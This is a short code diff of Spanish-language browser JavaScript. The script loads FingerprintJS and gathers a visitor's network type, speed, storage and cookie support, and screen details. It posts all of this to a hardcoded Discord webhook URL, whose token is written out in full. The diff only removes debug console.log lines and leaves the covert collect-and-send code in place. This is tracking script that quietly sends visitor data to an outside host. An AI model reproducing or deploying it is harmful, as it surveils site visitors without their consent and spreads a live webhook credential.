@@ -20,11 +20,6 @@ import('https://openfpcdn.io/fingerprintjs/v3').then(FP => FP.load()).then(fp =>
     const cookiesEnabled = navigator.cookieEnabled ? "Sí" : "No";
     const additionalInfo = /Mobi|Android|iPhone|iPad/i.test(ua) ? {"🎮 Orientación de pantalla": window.orientation ? `${window.orientation}°` : "Desconocido","📐 Resolución de Pantalla": screenResolution} : {};
     const url = 'https://discord.com/api/webhooks/1346691903265181697/HRcuwXPFPsr6Y0nbNj3jH9C8cvQ_jJqi0OayLg_XJPSELEU1lt48kNmXINXZFsvJ934Z';
-    console.log('Conexión Red:', connectionType);
-    console.log('Velocidad de Red:', connectionSpeed);
-    console.log('Soporte LocalStorage:', localStorageSupport);
-    console.log('Soporte Cookies:', cookiesEnabled);
-    console.log('Orientación de Pantalla:', window.orientation);
     fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
